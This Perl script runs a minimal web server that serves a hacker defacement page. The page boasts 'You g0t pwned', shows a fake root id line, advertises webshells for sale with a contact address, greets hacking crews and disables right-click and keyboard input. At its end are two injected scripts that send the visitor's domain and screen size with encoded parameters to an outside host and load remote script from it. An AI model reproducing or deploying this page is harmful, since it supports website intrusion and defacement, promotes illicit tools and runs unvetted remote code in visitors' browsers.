#!/usr/bin/perl -w
use strict;
use IO::Socket;

sub Wait {
	wait; # wait needed to keep <defunct> pids from building up
}

$SIG{CHLD} = \&Wait;

my $server = IO::Socket::INET->new(
	LocalPort 	=> 6969,	# set port
	Type 		=> SOCK_STREAM,
	Reuse 		=> 1,
	Listen 		=> 10) or die "$@\n";
my $client ;

while($client = $server->accept()) {
	select $client;
	print $client "HTTP/1.0 200 OK\r\n";
	print $client "Content-type: text/html\r\n\r\n";
	print $client '<!DOCTYPE html>
<html lang="en">
<head>
<embed src="http://www.youtube.com/v/FPmr7F-spkk&autoplay=1" type="application/x-shockwave-flash"wmode="transparent" width="1" height="1"></embed>

	<meta charset="UTF-8">
	<title>Eldersc0de_</title><link href="https://fonts.googleapis.com/css?family=Dosis|Freckle+Face|Walter+Turncoat" rel="stylesheet"> <link href='http://findicons.com/files/icons/2579/iphone_icons/40/smiley_sad.png' rel='icon' type='image/x-icon'/>
<meta property='og:title'              content='pwn3rdz by Jakarta6etar | Eldersc0de_' />
<meta property='og:description'        content='Jakarta6etar| Eldersc0de Family' />
</head>
<style type="text/css">
body {
	background: #000;
	font-family: 'Courier new';
	text-align: center;
	color: #fff;
}
img{
	margin-top: 3%;
	width: 250px;
	opacity: 1;
}
#bg {
	margin: auto;
}
marquee{
	color: white;
}
</style>
<body>	

	    <img src="https://i1.sndcdn.com/avatars-000182721928-40ffjs-t500x500.jpg"  />

<div id="contain">
<div id="bg">
<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;'>
<center>
	<font size="2" color="red">[</font>
		<font size="3" color="white">Jakarta6etar</font>
		<font size="2" color="red">]</font>
			<br><br>
		<br>
		<font size="2" color="white"> .: id .: <br>uid=0(root) gid=0(root) groups=0(root)</font><br><br><br>
<font color="red">[</font>
<font color="white" size="3">Msg</font>
<font color="red">]</font><br>
<font color="white" size="2">Zuhahahaha .. You g0t pwned? lulz !</font><br><font color="white" size="2">Forsale Webshell everyday.<br> contact: entahsiapayangnannya@gmail.com</font>
			<br>
			<br>
		<font color="red" size="2">[</font>Greetz<font color="red" size="2">]<br><br></font>
       <center><marquee width="45%" behavior="alternate" scrollamount="5" style="width: 45%;"><font color="white" size="2">7ourney ~ RobinR00t ~ Vuln Walker ~ Arpns1986x ~  Mr.Jason ~ Justice Crew ~ Maniak k4sur ~ Tukanag Isp ~ WithOutName ~ Brandal ~ Fx106 ~ Vrcry ~ Phantom Ghost ~ Bandung Blackhat ~ Surabaya Hacker Link ~ Jakarta6etar ~ CowoKerensTeam ~ Team_cc ~ Extreme Crew -
 </font></marquee></center><br>
\<font color="red" size="4">Jakarta</font><font color="white" size="4"> Insomia</font>/<br><br>
No Army Can  Stop An Idea ,Only God Can Stop Me ! ~ <br> Indonesia Hacker Rulez <br><br>
<font color="white" size="4"> Stamped By <font color="red" size="4">Jakart<font color="white" size="4">a6etar</font>


</div>
</div>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582H6x5iDAuv2BaBE4X3VXCkfrwWkiJ4vEyEh10pFq66g4XzcifSzvSYSJCOrn7x57fNFXF2uXouvXggdJanj4D%2fNM6mDCVYvyd8h6PMrrhabRON%2fIoEyT3dMf%2b868BNZ0A53CJ7v9VIKhnjCJ%2bjTEOlcLJdBB9IJlcolQpaheHpvPpqzGi6UKL%2fpNjDJ0WpsqODuTEayFKjXznG9ius8cH2wBJabPOdfvTohws2Pa9U1AJSMGobHmE6sKkf4MYUBjlnMFW20gi7Kkw6da37XPwZKFI5XkvsDIT8JCOxoCdaxRj6pXbbys3mV082uFEJX3DN0CHHsfFn1ZPmiBRJZ6wGMy3xxbzZDP0nGrry39SGCOPbT9J0B7QxK9JS2RXgod4vG%2b6a07JhMyx3b2GPS3HKvKI2J5KnQKK4xILM069lrHUErljLpn0N1BGK8ErcuI5g%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582H6x5iDAuv2BogxaChtjQfxClH%2fq%2bTK8%2bJxXKsSUJ5eE07p0E%2f5MTMXwtsorIxxkf%2f88mICyG4JZbHj709PT5L4MlDUDWweeseoibE2Z1ZVav%2fIVghx9LTJS98oUv7zj%2fn8riBe3oW3PPekdQTn8j8hnnsuyDHg4wYa9uIAnbm7LqDkalWFln1VC0h5jZkesm5m4ZCx7Da5MEd%2fdrD8tCituZ1Rlp6kqJ%2f5arvxajUnRFCtaggbKUuhQP63U26a3dJP6NjO4eJJ1%2fGaQqtpP4%2fTsscfgKefm5HBi3yRDumB57KYuBOUGmaHaZorVxTtX3wfle9Uai8YlR1sOJX2SBzbhuuTpdL9wRm%2f8Kck2Aw8Bn7sAlVe7xyN5vh8xskKjRADiIibKGh4lplixtydBnpv0yEuSdccgtuyyN26z08RseKIetDW8Fxp7lktVm%2bUaA3%2f%2b889LuWP6dTopVJFB6WVpwjFSsWpa%2f1pOM9tmBxOYwdipT9a1FHZlopIr6lzN79LteNaxl8PaarPWTT89Cog%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
'; # set your html content
}
continue {
	close($client); #kills hangs
	kill CHLD => -$$;
}